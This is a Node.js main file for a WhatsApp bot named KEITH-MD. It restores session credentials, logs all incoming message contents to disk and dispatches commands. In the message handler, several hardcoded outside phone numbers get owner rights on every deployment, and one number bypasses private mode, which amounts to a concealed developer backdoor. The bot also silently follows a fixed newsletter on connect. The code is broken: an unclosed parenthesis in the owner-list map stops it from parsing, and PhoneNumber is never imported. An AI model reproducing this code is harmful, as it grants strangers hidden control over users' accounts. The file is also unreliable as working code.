const fs = require('fs');
const zlib = require('zlib');
const path = require('path');
const chalk = require('chalk');
const { session } = require("./settings");

// Custom chalk colors
const keithPurple = chalk.hex('#A020F0');
const keithBlue = chalk.hex('#1DA1F2');
const keithPink = chalk.hex('#FF69B4');
const keithGreen = chalk.hex('#2ECC71');
const keithOrange = chalk.hex('#FFA500');
const keithGold = chalk.hex('#FFD700');
const keithRed = chalk.hex('#E74C3C');
const keithYellow = chalk.hex('#F1C40F');

// Unicode symbols
const BOT_SYMBOL = '✦';
const MESSAGE_SYMBOL = '✉';
const USER_SYMBOL = '👤';
const GROUP_SYMBOL = '👥';
const TYPE_SYMBOL = '📋';
const CONTENT_SYMBOL = '📝';
const ERROR_SYMBOL = '⚠️';
const SUCCESS_SYMBOL = '✅';
const WARNING_SYMBOL = '⚠️';

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}

// Enhanced logger class
class KeithLogger {
    static logMessage(m) {
        const isGroup = m.isGroup;
        const groupName = m.isGroup ? m.chat : '';
        const senderName = m.pushName || 'Unknown';
        const senderId = m.sender;
        const messageType = m.mtype;
        const text = m.text || '';

        console.log(keithPurple.bold(`\t ${BOT_SYMBOL} ${BOT_SYMBOL} ${BOT_SYMBOL} { K E I T H - M D } ${BOT_SYMBOL} ${BOT_SYMBOL} ${BOT_SYMBOL}`));
        console.log(keithGold.bold("╔════════════════════════════╗"));
        console.log(keithGold.bold(`║ ${MESSAGE_SYMBOL}   N E W   M E S S A G E   ${MESSAGE_SYMBOL} ║`));
        console.log(keithGold.bold("╚════════════════════════════╝"));
        
        if (isGroup) {
            console.log(keithGreen(`${GROUP_SYMBOL} Message from: `) + keithBlue.bold(groupName));
        }
        
        console.log(keithGreen(`${USER_SYMBOL} Sender: `) + 
            keithPink.bold(`[${senderName}] `) + 
            keithOrange(`(${senderId.split("@s.whatsapp.net")[0]})`));
        
        console.log(keithGreen(`${TYPE_SYMBOL} Type: `) + keithBlue.bold(messageType));
        
        console.log(keithGold.bold("┌────────────────────────────┐"));
        console.log(keithGreen(`${CONTENT_SYMBOL} Content:`));
        console.log(keithGold.bold("├────────────────────────────┤"));
        console.log(chalk.whiteBright(text));
        console.log(keithGold.bold("└────────────────────────────┘"));
        
        // Log to daily file
        const today = new Date().toISOString().split('T')[0];
        const logFile = path.join(logsDir, `messages_${today}.log`);
        const logEntry = `[${new Date().toISOString()}] ${isGroup ? `Group: ${groupName} | ` : ''}Sender: ${senderName} (${senderId.split("@s.whatsapp.net")[0]}) | Type: ${messageType} | Content: ${text}\n`;
        fs.appendFileSync(logFile, logEntry);
    }

    static error(message, error) {
        console.log(keithRed.bold(`${ERROR_SYMBOL} [ERROR] ${message}`));
        if (error) {
            console.log(keithRed(error.stack || error.message));
        }
        
        const today = new Date().toISOString().split('T')[0];
        const logFile = path.join(logsDir, `errors_${today}.log`);
        const logEntry = `[${new Date().toISOString()}] [ERROR] ${message}\n${error ? (error.stack || error.message) : ''}\n`;
        fs.appendFileSync(logFile, logEntry);
    }

    static success(message) {
        console.log(keithGreen.bold(`${SUCCESS_SYMBOL} [SUCCESS] ${message}`));
        
        const today = new Date().toISOString().split('T')[0];
        const logFile = path.join(logsDir, `success_${today}.log`);
        const logEntry = `[${new Date().toISOString()}] [SUCCESS] ${message}\n`;
        fs.appendFileSync(logFile, logEntry);
    }

    static warning(message) {
        console.log(keithYellow.bold(`${WARNING_SYMBOL} [WARNING] ${message}`));
        
        const today = new Date().toISOString().split('T')[0];
        const logFile = path.join(logsDir, `warnings_${today}.log`);
        const logEntry = `[${new Date().toISOString()}] [WARNING] ${message}\n`;
        fs.appendFileSync(logFile, logEntry);
    }

    static info(message) {
        console.log(keithBlue.bold(`[INFO] ${message}`));
        
        const today = new Date().toISOString().split('T')[0];
        const logFile = path.join(logsDir, `info_${today}.log`);
        const logEntry = `[${new Date().toISOString()}] [INFO] ${message}\n`;
        fs.appendFileSync(logFile, logEntry);
    }
}

async function authenticateSession() {
    try {
        const credsPath = "./session/creds.json";

        if (!fs.existsSync(credsPath)) {
            KeithLogger.info("Connecting to WhatsApp...");

            const [header, b64data] = session.split(';;;');

            if (header === "KEITH" && b64data) {
                const compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
                const decompressedData = zlib.gunzipSync(compressedData);
                fs.writeFileSync(credsPath, decompressedData, "utf8");
                KeithLogger.success("Session credentials created successfully");
            } else {
                throw new Error("Invalid session format");
            }
        } else if (session !== "zokk") {
            KeithLogger.info("Updating existing session...");

            const [header, b64data] = session.split(';;;');

            if (header === "KEITH" && b64data) {
                const compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
                const decompressedData = zlib.gunzipSync(compressedData);
                fs.writeFileSync(credsPath, decompressedData, "utf8");
                KeithLogger.success("Session credentials updated successfully");
            } else {
                throw new Error("Invalid session format");
            }
        }
    } catch (error) {
        KeithLogger.error("Session authentication failed", error);
        return;
    }
}

authenticateSession();

const {
    default: KeithConnect,
    useMultiFileAuthState,
    makeInMemoryStore,
    downloadContentFromMessage,
    jidDecode,
    DisconnectReason
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const { Boom } = require("@hapi/boom");
const FileType = require("file-type");
const express = require("express");
const { DateTime } = require("luxon");
const { smsg } = require('./lib/smsg');
const { commands, totalCommands } = require("./commandHandler");

const {
    autoview, autostatusreply, autostatusmsg, permit, autoread, botname, chatbot, timezone, autobio, mode, anticallmsg, reactemoji, prefix, presence,
    mycode, author, antibad, autodownloadstatus, packname, url, voicechatbot2, gurl, herokuAppname, greet, greetmsg, herokuapikey, anticall, dev, antilink, gcpresence, antibot, antitag, antidelete, autolike, voicechatbot
} = require("./settings");

const app = express();
const port = process.env.PORT || 10000;

function getGroupAdmins(participants) {
    return participants
        .filter(p => p.admin === "superadmin" || p.admin === "admin")
        .map(p => p.id);
}

async function startKeith() {
    const { saveCreds, state } = await useMultiFileAuthState("session");
    const client = KeithConnect({
        logger: pino({ level: "silent" }),
        printQRInTerminal: true,
        version: [2, 3000, 1015901307],
        browser: ["KEITH-MD", "Safari", "3.0"],
        fireInitQueries: false,
        shouldSyncHistoryMessage: true,
        downloadHistory: true,
        syncFullHistory: true,
        generateHighQualityLinkPreview: true,
        markOnlineOnConnect: true,
        keepAliveIntervalMs: 30000,
        auth: state,
        getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id);
                return msg.message || undefined;
            }
            return { conversation: "HERE" };
        },
    });

    const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
    store.bind(client.ev);
    
    client.ev.on("messages.upsert", async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            mek.message = mek.message.ephemeralMessage?.message || mek.message;
            
            const m = smsg(client, mek, store);
            KeithLogger.logMessage(m);

            const botId = client.decodeJid(client.user.id);
           
            if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;

            const body = m.mtype === "conversation" ? m.message.conversation :
                m.mtype === "imageMessage" ? m.message.imageMessage.caption :
                m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : "";

            const isCommand = body.startsWith(prefix);
            const args = body.trim().split(/ +/).slice(1);
            const pushname = m.pushName || "No Name";
            const botNumber = await client.decodeJid(client.user.id);
            const servBot = botNumber.split('@')[0];
            const superUserNumbers = [
                servBot, 
                "254796299159", 
                "254110190196", 
                "254748387615", 
                "254786989022", 
                dev
            ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            
            const isOwner = superUserNumbers.includes(m.sender); 
            const isBotMessage = m.sender === botNumber;
            const text = args.join(" ");
            const mentionedJids = m.mtype === "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null
                ? m.message.extendedTextMessage.contextInfo.mentionedJid
                : [];

            const quotedMessage = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
            const messageText = typeof m.text === "string" ? m.text : "";

            const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(() => {}) : "";
            const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
            const groupAdmin = m.isGroup ? getGroupAdmins(participants) : [];
            const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : false;
            const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false;

            if (isCommand && mode === "private" && m.sender !== botNumber && m.sender !== "254748387615@s.whatsapp.net") {
                return;
            }
            
            try {
                const Blocked = await client.fetchBlocklist();
                if (isCommand && m.isGroup && Blocked?.includes(m.sender)) {
                    await m.reply("You are blocked from using bot commands.");
                    return;
                }

                if (m.chat.endsWith('@s.whatsapp.net') && isCommand && permit === 'true' && !isOwner) {
                    await m.reply("You have no access to commands here. ❌");
                    return;
                }
            } catch (error) {
                KeithLogger.error("Error processing command permissions", error);
            }

            const command = isCommand ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : null;
            if (command) {
                const commandObj = commands[command];
                if (commandObj) {
                    try {
                        await commandObj.execute({ 
                            client, 
                            m, 
                            args,
                            text,
                            isOwner,
                            isAdmin,
                            isBotAdmin,
                            groupAdmin,
                            participants,
                            pushname,
                            botNumber,
                            prefix,
                            store
                        });
                        KeithLogger.info(`Command executed: ${command}`);
                    } catch (error) {
                        KeithLogger.error(`Error executing command: ${command}`, error);
                    }
                }
            }
        } catch (err) {
            KeithLogger.error("Error processing message", err);
        }
    });

    process.on("unhandledRejection", (reason, promise) => {
        KeithLogger.error(`Unhandled Rejection at: ${promise}`, reason);
    });

    process.on("uncaughtException", (err) => {
        KeithLogger.error("Caught exception", err);
    });

    client.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            const decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
        }
        return jid;
    };

    client.getName = async (jid) => {
        const id = client.decodeJid(jid);
        if (id.endsWith("@g.us")) {
            const group = store.contacts[id] || (await client.groupMetadata(id)) || {};
            return group.name || group.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international");
        }
        const contact = store.contacts[id] || {};
        return contact.name || contact.subject || contact.verifiedName || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international");
    };

    client.public = true;
    client.serializeM = (m) => smsg(client, m, store);

    client.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            const reasons = {
                [DisconnectReason.badSession]: "Bad Session File, Please Delete Session and Scan Again",
                [DisconnectReason.connectionClosed]: "Connection closed, reconnecting...",
                [DisconnectReason.connectionLost]: "Connection Lost from Server, reconnecting...",
                [DisconnectReason.connectionReplaced]: "Connection Replaced, Another New Session Opened, Please Restart Bot",
                [DisconnectReason.loggedOut]: "Device Logged Out, Please Delete File creds.json and Scan Again",
                [DisconnectReason.restartRequired]: "Restart Required, Restarting...",
                [DisconnectReason.timedOut]: "Connection TimedOut, Reconnecting...",
            };
            
            const reasonMessage = reasons[reason] || `Unknown DisconnectReason: ${reason}`;
            if ([DisconnectReason.badSession, DisconnectReason.connectionReplaced, DisconnectReason.loggedOut].includes(reason)) {
                KeithLogger.error(reasonMessage);
                process.exit();
            } else {
                KeithLogger.warning(reasonMessage);
                startKeith();
            }
        } else if (connection === "open") {
            await client.newsletterFollow("120363266249040649@newsletter");

            KeithLogger.success("Connected to Keith server");
            KeithLogger.success("Bot is now active");
            KeithLogger.info(`Loaded ${totalCommands} commands`);

            const getGreeting = () => {
                const currentHour = DateTime.now().setZone("Africa/Nairobi").hour;
                if (currentHour >= 5 && currentHour < 12) return "Good morning 🌄";
                if (currentHour >= 12 && currentHour < 18) return "Good afternoon ☀️";
                if (currentHour >= 18 && currentHour < 22) return "Good evening 🌆";
                return "Good night 😴";
            };

            const message = `Holla, ${getGreeting()},\n\n╭═══『 ${botname} 𝐢𝐬 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝』══⊷ \n` +
                `║ ʙᴏᴛ ᴏᴡɴᴇʀ ${author}\n` +
                `║ ᴍᴏᴅᴇ ${mode}\n` +
                `║ ᴘʀᴇғɪx [  ${prefix} ]\n` +
                `║ ᴛᴏᴛᴀʟ ᴘʟᴜɢɪɴs ${totalCommands}\n` +
                `║ ᴛɪᴍᴇ ${DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE)}\n` +
                `║ ʟɪʙʀᴀʀʏ Baileys\n` +
                `╰═════════════════⊷`;

            await client.sendMessage(client.user.id, { text: message });
            KeithLogger.info(message);
        }
    });

    client.ev.on("creds.update", saveCreds);

    app.use(express.static("public"));
    app.get("/", (req, res) => res.sendFile(__dirname + "/index.html"));
    app.listen(port, () => KeithLogger.info(`Server listening on port http://localhost:${port}`));

    return client;
}

startKeith();

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    KeithLogger.warning(`Update detected in ${__filename}`);
    delete require.cache[file];
    require(file);
});
